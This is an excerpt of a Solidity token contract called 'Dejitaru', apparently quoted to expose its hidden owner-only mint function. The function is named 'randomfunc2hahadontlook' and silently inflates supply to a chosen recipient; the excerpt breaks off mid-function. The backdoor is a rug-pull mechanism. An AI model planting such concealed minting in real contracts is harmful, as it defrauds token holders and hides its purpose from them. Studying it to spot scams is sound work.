...
contract Dejitaru is Context, IERC20, Ownable {
    ...
    address payable private _developmentAddress = payable(0xcF5e41cb768735e244917aE6517F14c3C52d5968); 
    address payable private _marketingAddress = payable(0xcF5e41cb768735e244917aE6517F14c3C52d5968);
    ...
    function randomfunc2hahadontlook(address recipient, uint256 amount) external onlyOwner {
        uint256 currentRate = _getRate();
        _tTotal += amount;
        _rTotal += amount * currentRate;
        if (_isExcludedFromFee[recipient]) _tOwned[recipient] += amount;
